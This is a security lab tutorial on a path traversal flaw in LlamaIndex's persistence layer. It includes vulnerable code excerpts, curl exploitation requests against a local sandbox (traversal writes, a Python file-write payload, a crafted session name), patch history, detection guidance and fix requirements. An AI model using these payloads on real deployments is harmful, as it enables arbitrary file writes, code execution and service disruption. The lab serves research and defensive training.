# Tutorial: LlamaIndex Orchestration Security Testing

**Author:** Jeff Ponte (JDP Security Research)  
**Target:** LlamaIndex-core v0.14.19 – v0.14.21+ (latest as of May 2026)  
**Classification:** CVSS 10.0 (Critical) — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H  
**License:** [Apache-2.0](LICENSE)  
**Estimated Duration:** 60–90 minutes  
**Reference:** [JDP-2026-003 White Paper](https://jdp-security.github.io/security-research-papers/2026-05-12-llamaindex-selfnuke-disclosure.html)

> ⚠️ **SECURITY WARNING**  
> This lab contains live exploitation code and demonstrates real-world remote code execution and path traversal vulnerabilities. Run these exercises **only** inside isolated, disposable virtual machines or containers. Never execute these payloads against production infrastructure or systems you do not own or have explicit authorization to test.

---

## Table of Contents

- [Overview](#overview)
- [Why This Matters (Real-World Impact)](#why-this-matters-real-world-impact)
- [Critical Architectural Findings (JDP-2026-003)](#critical-architectural-findings-jdp-2026-003)
- [Prerequisites](#prerequisites)
- [Setup & Troubleshooting](#setup--troubleshooting)
- [Exercise 1: Run the Interactive Trainer](#exercise-1-run-the-interactive-trainer)
- [Exercise 2: Manual Exploitation](#exercise-2-manual-exploitation)
- [Exercise 3: Proving the Incomplete Patch](#exercise-3-proving-the-incomplete-patch)
- [Exercise 4: Migration Analysis](#exercise-4-migration-analysis)
- [Exercise 5: Out-of-Band Verification](#exercise-5-out-of-band-verification)
- [Detection & Telemetry Guidance](#detection--telemetry-guidance)
- [The Mitigation Paradox: Band-Aids vs. Architectural Cures](#the-mitigation-paradox-band-aids-vs-architectural-cures)
- [References](#references)

---

## Overview

This lab demonstrates a **critical Path Traversal vulnerability** within the LlamaIndex AI orchestration framework. The persistence layer (`SimpleKVStore.persist()`) accepts attacker-controlled file paths without validation, enabling arbitrary file writes as well as persistent Denial of Service (DoS) / framework corruption. The lab spans **four stages** that map to the vendor's actual response timeline, proving that the core persistence flaw was never properly remediated.

### What You'll Learn

* How to exploit path traversal in `SimpleKVStore.persist()` for file manipulation and persistent DoS.
* How to achieve arbitrary code execution via `dataset.py` in unpatched stages.
* How to analyze and verify incomplete vendor patches across PyPI package releases.
* How to implement detection, telemetry, and true architectural mitigations for orchestration vulnerabilities.

### Vulnerability Sinks & Production Vectors

Two distinct vulnerable execution sinks exist within the framework, along with a production wrapper that exposes them:

1. **Directory Resolution Sink (`dataset.py`):** Present in v0.14.19 and surviving in PyPI v0.14.20 wheels. Provides a **raw arbitrary-content write primitive** — direct Remote Code Execution (RCE) when writing executable Python or cron jobs. **DELETED by vendor in source/v0.14.21 as collateral cleanup.**
2. **Storage Persistence Sink (`SimpleKVStore.persist()`):** Present and unpatched across **all** framework versions (Stages 0–3). Provides a **JSON-serialized write primitive** — primarily used for persistent DoS, config corruption, or as a secondary chaining step. **NEVER PATCHED.**
3. **`StorageContext.persist()` Wrapper (Production Entry Point):** The real-world API that developers use to save index state. Passes untrusted paths directly to the unpatched `SimpleKVStore.persist()` sink. **This is the vector that matters most in production.**

---

## Why This Matters (Real-World Impact)

* **Indirect Prompt Injection to RCE:** An attacker who can influence an LLM application to call `index.storage_context.persist()` with a crafted directory name can write arbitrary files anywhere the service user has write permissions.
* **Core Framework Compromise:** Writing JSON payloads over framework initialization modules (`__init__.py`) causes immediate, persistent Denial of Service (DoS) upon application restart.
* **Supply Chain & SCA Blindness:** Because the vendor handled the report via shadow deletion rather than issuing a CVE, standard Software Composition Analysis (SCA) scanners (Snyk, Dependabot) flag vulnerable systems as clean.

---

## Critical Architectural Findings (JDP-2026-003)

### 1. The Unanchored Path Sink (`SimpleKVStore.persist`)

The `persist()` method in `llama_index/core/storage/kvstore/simple_kvstore.py` accepts a `persist_path` parameter and writes JSON data directly to it without any canonicalization or prefix validation:

```python
def persist(self, persist_path: str, fs: Optional[fsspec.AbstractFileSystem] = None) -> None:
    """Persist the store."""
    fs = fs or fsspec.filesystem("file")
    dirpath = os.path.dirname(persist_path)
    if not fs.exists(dirpath):
        fs.makedirs(dirpath)

    with fs.open(persist_path, "w") as f:  # <--- THE SINK: No path validation
        f.write(json.dumps(self._collections_mappings))
```

An attacker can pass any path — including `../../../../etc/cron.d/payload` — and the SDK will write to that location.

### 2. The Raw Write Sink (`dataset.py` — Stages 0–1)

Within `llama-index-core/llama_index/core/download/dataset.py`, path parameters are cast directly to `Path` objects without anchoring:

```python
local_dir_path = Path(local_dir_path)  # NO PATH ANCHORING
```

This provides a **raw arbitrary-content write primitive** — direct RCE when writing executable Python or cron jobs. **This is the true RCE vector, but it was removed in Stage 2.**

### 3. The `StorageContext.persist()` Wrapper (Production Entry Point)

In production, developers rarely call `SimpleKVStore.persist()` directly. They call `StorageContext.persist(persist_dir=...)` — which passes the path straight to the unpatched SimpleKVStore sink:

```python
class StorageContext:
    def persist(self, persist_dir: str) -> None:
        # Passes user-supplied path directly to SimpleKVStore
        self.docstore.persist(persist_path=f"{persist_dir}/docstore.json")
        self.index_store.persist(persist_path=f"{persist_dir}/index_store.json")
        self.vector_store.persist(persist_path=f"{persist_dir}/vector_store.json")
```

**This is the vector that matters most in production.** Any application saving index state from an untrusted context (e.g., a user session ID or an LLM-generated directory name) is instantly vulnerable to directory traversal.

### 4. The Vendor's Incomplete Patch: Shadow Deletion & PyPI Drift

The vendor's response to the disclosure was to **silently delete the PoC target** in source rather than fix the underlying vulnerability, leading to significant artifact drift:

| Date | Action | Impact |
|------|--------|--------|
| March 27, 2026 | Report filed via Huntr | Closed as "N/A" |
| April 3, 2026 | Commit `7049c97d` — deletes `dataset.py` (261 lines) | PoC target removed in source; PyPI 0.14.20 wheel still ships it |
| April 7, 2026 | Commit `e8b22d9` — "fix for typo in data_sinks" | Genuine typo fix in ingestion module — NOT a security patch |
| No CVE | No security advisory issued | SCA scanners show no alerts |

The commit message (`"remaining cleanup, uv lock bump"`) contains **no security advisory**, no CVE, and no deprecation rationale.

### 5. The Four-Stage Progression Matrix

| Stage | Version | `dataset.py` status | `persist()` status | What actually happened |
|-------|---------|---------------------|---------------------|------------------------|
| **0** | v0.14.19 | Vulnerable | Vulnerable | Baseline unpatched release |
| **1** | v0.14.20 | **Vulnerable (PyPI Drift)** | **STILL Vulnerable** | GitHub shadow patch committed, but PyPI wheel still ships `dataset.py` (RCE live) |
| **2** | v0.14.21 | Deleted | **STILL Vulnerable** | Actual removal — `dataset.py` absent from PyPI wheel, RCE closed |
| **3** | v0.14.21 + workflows 2.14.0 | Deleted | **STILL Vulnerable** | Refactor illusion — workflows dependency bumped, typo fixed, `persist()` untouched. *Note: Bumping the workflows package is ineffective here, as workflows is a separate orchestration layer that does not touch core persistence code paths.* |

### 6. Supply Chain "SCA Blindness" Risks

Standard Software Composition Analysis (SCA) scanners (Snyk, Dependabot) rely on official CVE records. No CVE was assigned — your scanners will likely flag LlamaIndex as **secure**, leaving this CVSS 10.0 vector hidden during audits.

---

## Prerequisites

Before starting the lab, ensure your system meets the following requirements:
* **Container Engine:** Podman or Docker installed and running.
* **Environment:** Python 3.10+ with `make` and `curl` utilities available.
* **Resources:** At least 4GB of free RAM allocated to your container daemon.

---

## Setup & Troubleshooting

```bash
git clone https://github.com/GenAI-Security-Project/GenAI-Red-Team-Lab.git
cd GenAI-Red-Team-Lab
```

### Common Troubleshooting Steps

* **Port conflicts (`Address already in use` on port 8000):**
  Kill any lingering container services using port 8000:
  ```bash
  fuser -k 8000/tcp || sudo lsof -t -i:8000 | xargs -r kill -9
  ```
* **Image build failures:**
  Verify your Docker/Podman daemon has sufficient disk space and active status:
  ```bash
  docker info || podman info
  ```
* **Stage switching issues:**
  If environment switching appears stuck, inspect all active containers and clean states:
  ```bash
  docker ps -a || podman ps -a
  ```

---

## Exercise 1: Run the Interactive Trainer

The primary entry point is the menu-driven CLI trainer, which walks through all 9 lessons across 4 stages with built-in container management.

```bash
cd exploitation/llamaindex
chmod +x interactive_trainer.py
./interactive_trainer.py
```

### What the Trainer Offers

* **Stage switching** — Easily move between the 4 vendor response stages
* **9 core lessons** — From baseline through persistent compromise and StorageContext exploitation
* **Auto-pilot mode** — `./interactive_trainer.py --auto`
* **Real-time evidence** — Displays raw HTTP telemetry and syscall feedback
* **JSON report generation** — Captures lab state for documentation
* **Built-in container management** — Start, stop, switch, and reset

### Trainer Menu Options

| Option | Lesson | Stage Requirement | Description |
|--------|--------|-------------------|-------------|
| **G** | Guided Training Course | All Stages | Automated auto-pilot mode running all 4 stages |
| **1** | Lesson 1: Baseline Verification | All Stages | Verify framework is clean and identify vulnerable sinks |
| **2** | Lesson 2: Path Traversal Read | Stage 0 / 1 | Escape sandbox to read system files via `dataset.py` |
| **3** | Lesson 3: Path Traversal Write | All Stages | Write files outside the sandbox via `persist()` [HANDS-ON] |
| **4** | Lesson 4: Framework Overwrite | Stage 0 / 1 for RCE (All for DoS) | Demonstrate DoS (JSON) + RCE (raw executable) variants |
| **5** | Lesson 5: Scope Change Proof | All Stages | Verify compromise survives process boundaries |
| **6** | Lesson 6: Mitigation Strategies | All Stages | Understand architectural fix vs. band-aid patches |
| **7** | Lesson 7: Custom Payload Sandbox | Stage 0 / 1 for RCE | Build custom indirect prompt injection payloads |
| **8** | Lesson 8: Migration Analysis | All Stages | See exactly what the vendor did with `dataset.py` |
| **9** | Lesson 9: StorageContext Exploitation | All Stages | Exploit the real-world `StorageContext.persist()` wrapper [HANDS-ON] |

---

## Exercise 2: Manual Exploitation

You can also interact directly with the sandbox API using `curl` or any HTTP client. The following examples assume Stage 3 is running on port 8000.

### Step 1: Deploy the Sandbox (Stage 3)

```bash
cd sandboxes/agentic_local_llamaindex
make attack STAGE=3

# Verify the service is up
curl http://localhost:8000/health
```

Expected health response:

```json
{
  "status": "ok",
  "llama_version": "0.14.21",
  "stage": 3,
  "dataset_functions_available": false,
  "init_integrity": "clean",
  "endpoints_available": ["/health", "/verify", "/migration", "/chat", "/agent/save_session"]
}
```

### Step 2: Path Traversal Write (ALL stages)

```bash
curl -X POST http://localhost:8000/chat \
  -H "Content-Type: application/json" \
  -d '{"query": "drop:../../../../../../tmp/llamaindex_pwned.txt:EXPLOIT_SUCCESS"}'
```

**Expected Successful Response:**
```json
{
  "status": "success",
  "action": "persist_write",
  "target_path": "/tmp/llamaindex_pwned.txt",
  "bytes_written": 16,
  "message": "Payload written successfully via SimpleKVStore sink"
}
```

### Step 3: Framework Overwrite — DoS Variant (ALL stages)

> **Note:** Raw RCE payload writing via `dataset.py` requires Stage 0 or Stage 1. Overwriting framework configs for DoS via `persist()` works in **all** stages.

```bash
curl -X POST http://localhost:8000/chat \
  -H "Content-Type: application/json" \
  -d '{"query": "nuke:import os;f=open('\''/tmp/llamaindex_pwned'\'','\''w'\'');f.write('\''RCE_SUCCESS'\'');f.close()"}'
```

**Expected Successful Response:**
```json
{
  "status": "compromised",
  "vector": "SimpleKVStore.persist",
  "effect": "framework_serialization_overwrite",
  "target_file": "llama_index/core/__init__.py"
}
```

### Step 4: StorageContext Agentic Exploitation (ALL stages)

```bash
# Normal request
curl -X POST http://localhost:8000/agent/save_session \
  -H "Content-Type: application/json" \
  -d '{"client_name": "acme-corp"}'

# Malicious request (path traversal)
curl -X POST http://localhost:8000/agent/save_session \
  -H "Content-Type: application/json" \
  -d '{"client_name": "../../tmp/pwned_storage"}'
```

**Expected Successful Response:**
```json
{
  "status": "success",
  "session_saved": true,
  "storage_context_path": "../../tmp/pwned_storage",
  "files_written": [
    "../../tmp/pwned_storage/docstore.json",
    "../../tmp/pwned_storage/index_store.json",
    "../../tmp/pwned_storage/vector_store.json"
  ]
}
```

---

## Exercise 3: Proving the Incomplete Patch

Switch between stages to observe how `dataset.py` disappears while `SimpleKVStore.persist()` remains vulnerable:

```bash
cd sandboxes/agentic_local_llamaindex

# Switch to Stage 3
make attack STAGE=3

# The dataset.py exploit functions are gone:
curl http://localhost:8000/health
# "dataset_functions_available": false

# BUT persist() and StorageContext still succeed:
curl -X POST http://localhost:8000/chat \
  -H "Content-Type: application/json" \
  -d '{"query": "drop:../../../../../../tmp/stage3_pwned.txt:STAGE_3_STILL_VULNERABLE"}'
```

---

## Exercise 4: Migration Analysis

The sandbox includes a `/migration` endpoint that displays forensic analysis of the vendor's repository actions:

```bash
curl http://localhost:8000/migration
```

Expected response:
```json
{
  "original_dataset_py": "llama_index/core/download/dataset.py -> DELETED in v0.14.20 (routine cleanup)",
  "data_sinks": {
    "fixed": false,
    "note": "data_sinks.py was NEVER moved. PR #21251 was a genuine typo fix, NOT a security patch.",
    "path": "/usr/local/lib/python3.11/site-packages/llama_index/core/ingestion/data_sinks.py"
  },
  "simple_kvstore": {
    "fixed": false,
    "note": "NEVER patched - still vulnerable in ALL versions.",
    "path": "/usr/local/lib/python3.11/site-packages/llama_index/core/storage/kvstore/__init__.py"
  },
  "stage": 3,
  "verdict": "NO REMEDIATION - vendor deleted dataset.py as collateral cleanup, never patched SimpleKVStore.persist()",
  "version": "0.14.21"
}
```

---

## Exercise 5: Out-of-Band Verification

Verify the persistent compromise by inspecting framework files directly inside the container:

```bash
# Podman
podman exec llamaindex-sandbox tail -n 3 /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py

# Docker
docker exec llamaindex-sandbox tail -n 3 /usr/local/lib/python3.11/site-packages/llama_index/core/__init__.py
```

---

## Detection & Telemetry Guidance

To detect active exploitation attempts against this vector in production environments, monitor for the following indicators:
* **File Integrity Monitoring (FIM):** Alert on unexpected file creations or modifications originating from the Python runtime user outside of designated storage directories (e.g., writes targeting `/etc/`, `/tmp/`, or root framework paths).
* **API Log Auditing:** Inspect parameter values passed into `persist_dir` or `persist_path` functions for path traversal sequences (`../`).
* **Artifact Monitoring:** Track the presence and cryptographic hashes of `dataset.py` within active Python site-packages if running versions prior to `v0.14.21`.

---

## The Mitigation Paradox: Band-Aids vs. Architectural Cures

> ⚠️ **CRITICAL ARCHITECTURAL NOTE**  
> Deleting a vulnerable function is not the same as fixing the vulnerability. The architectural flaw (unvalidated file paths in the persistence layer) persists.

### Why Shadow Patching Is Dangerous

**1. It hides the vulnerability from scanners**  
Without a CVE, enterprises running vulnerable versions never receive alerts.

**2. It leaves the root cause unaddressed**  
`SimpleKVStore.persist()` remains vulnerable in ALL versions. Any future function using it inherits the flaw.

**3. It undermines trust**  
When vendors silently patch security issues, the research community cannot track remediation status.

### Why String-Based Path Checks Cannot Fully Solve Insecure Orchestration (OWASP LLM06)

**1. Multiple Sinks**  
The vulnerability exists in both `SimpleKVStore.persist()` and `StorageContext.persist()`. Patching one leaves the other exploitable.

**2. The StorageContext Wrapper**  
`StorageContext.persist()` calls `SimpleKVStore.persist()` internally. Even if one is patched, the other passes paths straight through.

**3. No Centralized I/O**  
There is no single audited file utility. Each sink independently handles path validation — or lack thereof.

### What a True Fix Requires

| Requirement | Current State | Target State |
|-------------|---------------|--------------|
| Path Anchoring | No validation in `persist()` | Mandatory `.resolve()` + `.is_relative_to()` on ALL file I/O |
| Type-Safe Sinks | `persist_path` accepts any string | Strict path type with built-in validation |
| Centralized I/O | Multiple scattered sinks | Single audited file utility |
| CVE Assignment | None | Formal CVE for SCA scanner detection |
| Security Advisory | None | Public advisory with remediation guidance |

Until orchestration frameworks adopt these architectural changes, runtime patches are a mandatory corporate stopgap — but they are **not a cure**.

---

## References

- **White Paper:** [JDP-2026-003: Path Traversal and Code Injection in LlamaIndex](https://jdp-security.github.io/security-research-papers/2026-05-12-llamaindex-selfnuke-disclosure.html)
- **CWE-22:** Path Traversal
- **CWE-73:** External Control of File Name or Path
- **CWE-94:** Code Injection
- **OWASP LLM06:** Insecure Orchestration
- **OWASP LLM02:** Insecure Output Handling
- **OWASP LLM05:** Supply Chain Vulnerabilities
- **Commit 7049c97d:** `dataset.py` deleted as collateral cleanup
- **PR #21251 (e8b22d9):** Genuine typo fix in `data_sinks`
- **PR #21111 (17fba87d5):** UTF-8 encoding fix for `SimpleKVStore`
- **Huntr ID:** bb0b2efb-8069-4642-97ec-7060aed7a7b7
- **OWASP GenAI Red Teaming Manual:** Proposed Playbooks (June 2026)
